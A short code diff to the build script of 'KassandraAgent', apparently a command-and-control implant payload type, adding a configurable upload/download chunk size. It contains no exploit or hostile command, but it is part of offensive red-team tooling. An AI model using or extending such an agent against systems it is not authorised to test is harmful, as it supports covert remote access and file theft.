@@ -30,6 +30,12 @@ class KassandraAgent(PayloadType):
             description="Choose output format",
             choices=["exe", "dll"],
             default_value="exe"
+        ),
+        BuildParameter(
+            name="chunk_size",
+            parameter_type=BuildParameterType.String,
+            description="Chunk size in bytes for upload/download",
+            default_value="4096"
         )
     ]                                             # Array if we want custom parameters during build
     agent_path = pathlib.Path(".") / "Kassandra"                           # Path of Kassandra
@@ -98,6 +104,7 @@ class KassandraAgent(PayloadType):
             content = content.replace("%PROXYURL%", Config["proxy_host"])
             content = content.replace("%SLEEPTIME%", str(Config["callback_interval"]))
             content = content.replace("%JITTER%", str(Config["callback_jitter"]))
+            content = content.replace("%CHUNKSIZE%", str(self.get_parameter("chunk_size")))
             content = content.replace("%SSL%", "true" if Config["ssl"] else "false")
             content = content.replace("%PROXYENABLED%", "true" if Config["proxyEnabled"] else "false")
 
